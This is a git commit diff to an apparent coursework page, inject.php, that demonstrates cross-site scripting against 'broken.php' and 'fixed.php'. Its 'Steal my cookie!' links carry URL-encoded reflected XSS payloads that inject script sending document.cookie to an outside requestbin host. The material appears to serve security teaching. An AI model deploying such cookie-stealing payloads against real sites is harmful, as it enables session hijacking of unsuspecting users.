de48ab10e886218c07da8f7baed75491d6aaf431
Gerjo <gerjoo@gmail.com>
2012-10-03 20:46:57 +0200

    removed unwanted characters

--- assignment2/www/inject.php
+++ assignment2/www/inject.php
@@ -3,7 +3,7 @@
     Ponies!
 </a><br>
 
-<a target="_blank" href="/broken.php/%22%3E%3C/form%3E%3Cscript%3E%20var%20image%20%3D%20new%20Image%28%29%3Bimage%5B%27src%27%5D%3Dunescape%28%27http%253A%252F%252Frequestb%252Ein/1jjb0wx1%3Fdaa%3Dbar%27%29%20%2B%20document%5B%27cookie%27%5D%3B%20%3C/script%3E%3Cform%20action%3D%22">
+<a target="_blank" href="/broken.php/%22%3E%3C/form%3E%3Cscript%3E%20var%20image%20%3D%20new%20Image%28%29%3Bimage%5B%27src%27%5D%3Dunescape%28%27http%253A%252F%252Frequestb%252Ein/1jjb0wx1%3F%3Dbar%27%29%20%2B%20document%5B%27cookie%27%5D%3B%20%3C/script%3E%3Cform%20action%3D%22">
     Steal my cookie!
 </a><br>
 
@@ -20,7 +20,7 @@
     Ponies!
 </a><br>
 
-<a target="_blank" href="/fixed.php/%22%3E%3C/form%3E%3Cscript%3E%20var%20image%20%3D%20new%20Image%28%29%3Bimage%5B%27src%27%5D%3Dunescape%28%27http%253A%252F%252Frequestb%252Ein/1jjb0wx1%3Fdaa%3Dbar%27%29%20%2B%20document%5B%27cookie%27%5D%3B%20%3C/script%3E%3Cform%20action%3D%22">
+<a target="_blank" href="/fixed.php/%22%3E%3C/form%3E%3Cscript%3E%20var%20image%20%3D%20new%20Image%28%29%3Bimage%5B%27src%27%5D%3Dunescape%28%27http%253A%252F%252Frequestb%252Ein/1jjb0wx1%3F%3Dbar%27%29%20%2B%20document%5B%27cookie%27%5D%3B%20%3C/script%3E%3Cform%20action%3D%22">
     Steal my cookie!
 </a><br>
 
